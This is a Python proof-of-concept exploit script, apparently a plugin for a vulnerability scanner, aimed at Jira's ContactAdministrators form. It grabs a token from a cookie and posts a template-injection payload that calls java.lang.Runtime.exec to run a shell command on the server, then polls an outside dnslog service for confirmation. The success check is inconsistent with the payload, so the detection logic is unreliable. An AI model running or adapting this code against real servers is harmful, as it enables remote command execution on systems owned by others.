import requests


def getdomain():
    try:
        s = requests.post("http://api.dnslog.gq:88/v1/users", timeout=10)
        token = s.json()['data']['token']
        domain = s.json()['data']['identity']
    except Exception as e:
        print(e)
    return domain, token


def getresult(domain, token):
    try:
        s1 = requests.get(f"http://api.dnslog.gq:88/v1/records?type=dns&token={token}&filter=")
        records = s1.json()['data'][0]['name']
        if records == domain:
            return True
    except Exception as e:
        print(e)

req=requests.Session()


def check(url,proxies):
    if proxies:
        proxies = {proxies['protocol']: proxies['protocol'] + '://' + proxies['ip'] + ':' + str(proxies['port'])}
    try:
        ret = {'success': False, 'response': [], 'requests': [], 'error': [], 'info': []}
        domain, token = getdomain()
        payload = f"$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('touch /tmp/success').toString()"
        print("[+] Get Token")
        r = req.get("%s/secure/ContactAdministrators!default.jspa" % url)
        c = r.headers['Set-Cookie']
        t = c[c.find("=") + 1:c.find(";")]
        data={
            "from":"test@gmail",
            "subject":payload,
            "details":"v",
            "token":t,
            "发送": "发送"
        }
        print("[+] Token : %s" % t)
        print("[+] Exploit")
        r = req.post("%s/secure/ContactAdministrators.jspa" %
                     url, data=data, allow_redirects=False,proxies=proxies)
        result = getresult(domain, token)
        if result==True:
            ret['success']=True
    except ZeroDivisionError as e:
        print(e)
    return  ret



def main(params):
    result = params.get('result', {})
    url = params.get('url', '')
    headers = params.get('headers', {})
    proxies = params.get('proxies', None)  # 代理
    timeout = params.get('timeout', 5)  # 超时时间
    result = check(url, proxies)
    return result


if __name__ == '__main__':
    params = {
        'result': {'success': False, 'response': [], 'requests': [], 'error': []},
        # headers：传入的header参数
        'headers': {},
        # proxy：传入的代理服务器参数
        'proxies': {'protocol': 'http', 'ip': '127.0.0.1', 'port': 8080},
        'timeout': 30,
        ###可选参数###
        'url': "http://127.0.0.1:8081",
    }
    print(main(params))